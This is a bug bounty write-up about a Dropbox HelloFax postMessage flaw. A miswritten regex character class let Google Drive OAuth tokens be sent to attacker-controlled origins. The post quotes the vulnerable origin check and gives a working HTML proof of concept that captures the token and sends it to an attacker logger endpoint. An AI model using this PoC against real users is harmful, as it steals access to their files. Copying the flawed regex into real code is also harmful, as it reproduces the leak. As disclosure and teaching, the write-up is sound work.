---
layout: post
title: [Dropbox bug bounty] Watch your regular expressions: Exploiting PostMessage bugs to leak GDrive tokens !
---

## TL;DR
In this blog post we will be discussing how minor validation issues in your regular expression patterns could lead to major security issues, the Dropbox's origin validation in the PostMessage function was misconfigured leading to GDrive tokens leak to third party origins !

## Introduction:
Dropbox's HelloFax offers documents management services to its users, particularly faxes:

![manage-documents](https://github.com/mdakh404/Algorithms-Data-Structures/assets/77294440/efba38f8-e7de-4ce6-a9a1-1832e34539c5)


Upon clicking on Send Fax to select your documents to be faxed, the following page will be shown:

![Fax-Documents](https://github.com/mdakh404/Algorithms-Data-Structures/assets/77294440/dce12a57-af39-4eb2-9f9a-b369ebcee2bd)


Documents could be uploaded either from our device or by integrating a third party service such as **Google Drive**, Upon clicking on the google drive icon, an OAuth window will pop up:

![google-drive-oauth](https://github.com/mdakh404/Algorithms-Data-Structures/assets/77294440/21804b65-d6d2-40cd-94f1-53a56618bdde)

- **NOTE:** whenever you see a window popup especially in OAuth integrations keep in mind that there is a possibility of using PostMessage functions, thus bringing other security issues to the table ! it isn't the case every time but keep it in mind when testing such applications !

After granting access in behalf of the user, Google will authorize the OAuth request and send the **authorization code** using the following GET request:

```
GET /home/googleNewFile?state=<state>&code=<authorization_code>&scope=email+profile+openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive.readonly+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&authuser=1&prompt=none HTTP/1.1
Host: app.hellofax.com
Cookie: <COOKIES>
```

The application hosted on `app.hellofax.com` will take the `authorization code` and exchanges it with access token, in our case it's a **Gdrive Access Token** in order to access user's **Google Drive** documents and files with the permissions predefined in the `scope` parameter, the whole process is explained in the following chart:

![authorization-code](https://github.com/mdakh404/Algorithms-Data-Structures/assets/77294440/9023ebaa-48ed-4c90-81f5-56e94195bda2)

After exchanging the **code** with a **GDrive access token**; The following response will be sent:

```
<script type="text/javascript" nonce="Bg2IcOtuFadT8UofntcBuA6M">
    let gdriveAccessToken = "<gdrive_access_token>";
    let gdriveReadonlyOAuthSucceed = "true";

    var resultObj = {
        gdriveAccessToken: gdriveAccessToken,
        gdriveReadonlyOAuthSucceed: gdriveReadonlyOAuthSucceed,
        type: "gdrive:readonlyOAuthSucceed", // needed to pass a message to the parent window
    };

    if (window.opener) {
        /**
         * Ensures we're only sending GDrive tokens to other hellosign domains (dev, qa, staging, prod)
         */
        let targetOrigin = window.opener.location.href.match(/^https:\/\/app\.[hellosign|dev-|qa-|staging-][^\/]+/)[0];

        window.opener.postMessage(resultObj, targetOrigin);
    }
</script>
```

The **GDrive access token** is assigned to a varibale with the name `gdriveAccessToken` which is also included within an object with the name `resultObj`, the application checks if there is an opener window, the comment `//Ensures we're only sending GDrive tokens to other hellosign domains (dev, qa, staging, prod)` shows that the validation on the origin will assure that the **GDrive access token** will be sent only to permitted origins (hellosign trusted domains) and **NOT** to third party origins (untrusted), to apply the validation functionality; the application used to match the opener window's origin with the following regular expression pattern:

```
 let targetOrigin = window.opener.location.href.match(/^https:\/\/app\.[hellosign|dev-|qa-|staging-][^\/]+/)[0];
```

It checks that the opener window's origin matches the following pattern:

```
/^https:\/\/app\.[hellosign|dev-|qa-|staging-][^\/]+/
```

Can you catch the error above ? Could you found it ? Great !

The developer tried to match the second-level domain with the domain names [hellosign-dev-qa-staging-] but he employed the wrong operator ! the character class `[]` will accept every character included there: `h, e, l, o, s, i, g, n, |, d, e, v, -, etc..` which offers to the attacker a flexibility in selecting the origin that will get the **Gdrive access token**, the pattern would accept `https://app.dev, https://app.hellosign, https://app.qa, https://app.staging` as trusted origins.

Therefore a PostMessage function will be invoked to send the `resultObj` that contains the **Gdrive token** to the opener window's origin validated by an insecure regular expression pattern, it could be  `app.dev` for example !

```
window.opener.postMessage(resultObj, targetOrigin);
```

## Time to Exploit: Bringing your brightest photos in Google Drive to the table !

To exploit this issue, the attacker must get a valid **authorization code** and a domain name with the origin https://app.dev for example that hosts the following exploit code:

```
<!DOCTYPE html>
<html>
<head>
    <title>PostMessage PoC</title>
</head>
<body>

    <script>

        window.open("https://app.hellofax.com/home/googleNewFile?state=<VALID_STATE>&code=<VALID_AUTHORIZATION_CODE>&scope=email+profile+openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive.readonly+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&authuser=1&prompt=none");

        window.addEventListener('message', (event) => {

            window.location.href = '/logger.php?gdrive_access_token=' + event.data.gdriveAccessToken; 

        })


    </script>

</body>
</html>
```

- **Impact:** Getting the **Gdrive access token** will give the attacker a scoped access to your Google Drive files including your holiday photos, your documents, and of course some information per the `email+userinfo.profile information` scope !

### Key Points:
- **For bug hunters/security professionals:** OAuth testing is one of my favorite parts in web security, whenever your find your screen filled with window popups that's a good indicator that you might face a PostMessage configuration, tokens/secrets/codes transmitted between windows need a secure way to travel, developers think that PostMessage is the right plane ! Stay tuned !
- **For developers:** I love regular expressions, a real art that everyone should respect, but I still support the classic method, an array with permitted origins and a strict string comparison will be enough to deliver the needed functionality.
- **For Internet users:** Google does a great job to secure your files/documents, but attackers have their weapons too ! that small click on your screen will be enough to pave attackers's way to your infos, make sure that you give your click to the right application !

Thanks for reading, if you have any question regarding this blog post please feel free to ping me on twitter `@mdakh404_`.
